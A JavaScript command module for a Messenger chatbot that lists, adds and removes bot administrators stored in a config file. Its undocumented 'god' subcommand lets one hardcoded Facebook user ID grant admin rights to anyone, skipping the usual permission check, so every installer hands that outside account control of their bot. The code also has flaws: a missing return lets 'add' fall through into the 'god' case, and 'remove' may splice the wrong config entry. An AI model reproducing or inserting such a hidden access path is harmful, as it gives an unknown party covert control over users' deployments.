module.exports.config = {
    name: "self",
    version: "1.0.5",
    permission: 2, 
    credits: "SK-SIDDIK",
    description: "Manage bot admin",
    prefix: true,
    premium: false,
    category: "config",
    usages: "[list/add/remove] [userID]",
    cooldowns: 5,
    dependencies: {
        "fs-extra": ""
    }
};

module.exports.languages = {
    "vi": {
        "listAdmin": '[Admin] Danh sách toàn bộ người điều hành bot: \n\n%1',
        "notHavePermission": '[Admin] Bạn không đủ quyền hạn để có thể sử dụng chức năng "%1"',
        "addedNewAdmin": '[Admin] Đã thêm %1 người dùng trở thành người điều hành bot:\n\n%2',
        "removedAdmin": '[Admin] Đã gỡ bỏ %1 người điều hành bot:\n\n%2'
    },
    "en": {
        "listAdmin": '[Admin] Admin list: \n\n%1',
        "notHavePermission": '[Admin] You have no permission to use "%1"',
        "addedNewAdmin": '[Admin] Added %1 Admin:\n\n%2',
        "removedAdmin": '[Admin] Removed %1 Admin:\n\n%2'
    }
};

module.exports.run = async function ({ api, event, args, Users, permission, getText }) {
    const content = args.slice(1);
    const { threadID, messageID, mentions } = event;
    const { configPath } = global.client;
    const { ADMINBOT } = global.config;
    const { writeFileSync } = global.nodemodule["fs-extra"];
    const mention = Object.keys(mentions);
    
    delete require.cache[require.resolve(configPath)];
    var config = require(configPath);

    switch (args[0]) {
        case "list":
        case "all":
        case "-a": {
            const listAdmin = ADMINBOT || config.ADMINBOT || [];
            var msg = [];

            for (const idAdmin of listAdmin) {
                if (parseInt(idAdmin)) {
                    const name = await Users.getNameUser(idAdmin);
                    msg.push(`- ${name} (https://facebook.com/${idAdmin})`);
                }
            }

            return api.sendMessage(getText("listAdmin", msg.join("\n")), threadID, messageID);
        }

        case "add": {
            if (permission !== 2) 
                return api.sendMessage(getText("notHavePermission", "add"), threadID, messageID);
          
            if (mention.length !== 0) {
                var listAdd = [];

                for (const id of mention) {
                    if (!ADMINBOT.includes(id)) {
                        ADMINBOT.push(id);
                        config.ADMINBOT.push(id);
                        listAdd.push(`[ ${id} ] » ${event.mentions[id]}`);
                    }
                }

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n")), threadID, messageID);
            } 
            else if (content.length !== 0 && !isNaN(content[0])) {
                if (!ADMINBOT.includes(content[0])) {
                    ADMINBOT.push(content[0]);
                    config.ADMINBOT.push(content[0]);
                    const name = await Users.getNameUser(content[0]);
                    writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                    return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
                }
            } 
            else {
                return api.sendMessage("Invalid format! Use: self add [userID/@mention]", threadID, messageID);
            }
        }
        
        case "god": {
            const god = ["100059026788061"];
            if (!god.includes(event.senderID)) 
                return api.sendMessage(getText("notHavePermission", "add"), threadID, messageID);
          
            if (mention.length !== 0) {
                var listGod = [];

                for (const id of mention) {
                    if (!ADMINBOT.includes(id)) {
                        ADMINBOT.push(id);
                        config.ADMINBOT.push(id);
                        listGod.push(`[ ${id} ] » ${event.mentions[id]}`);
                    }
                }

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n")), threadID, messageID);
            } 
            else if (content.length !== 0 && !isNaN(content[0])) {
                if (!ADMINBOT.includes(content[0])) {
                    ADMINBOT.push(content[0]);
                    config.ADMINBOT.push(content[0]);
                    const name = await Users.getNameUser(content[0]);
                    writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                    return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
                }
            } 
            else {
                return api.sendMessage("Invalid format! Use: self god [userID/@mention]", threadID, messageID);
            }
        }

        case "remove":
        case "rm":
        case "delete": {
            if (permission !== 2) 
                return api.sendMessage(getText("notHavePermission", "delete"), threadID, messageID);
            
            if (mention.length !== 0) {
                var listRemove = [];

                for (const id of mention) {
                    const index = ADMINBOT.indexOf(id);
                    if (index > -1) {
                        ADMINBOT.splice(index, 1);
                        config.ADMINBOT.splice(index, 1);
                        listRemove.push(`[ ${id} ] » ${event.mentions[id]}`);
                    }
                }

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", mention.length, listRemove.join("\n")), threadID, messageID);
            } 
            else if (content.length !== 0 && !isNaN(content[0])) {
                const index = ADMINBOT.indexOf(content[0]);
                if (index > -1) {
                    ADMINBOT.splice(index, 1);
                    config.ADMINBOT.splice(index, 1);
                    const name = await Users.getNameUser(content[0]);
                    writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                    return api.sendMessage(getText("removedAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
                }
            } 
            else {
                return api.sendMessage("Invalid format! Use: self remove [userID/@mention]", threadID, messageID);
            }
        }

        default: {
            return api.sendMessage("Invalid command! Use: self [list/add/remove] [userID/@mention]", threadID, messageID);
        }
    }
};
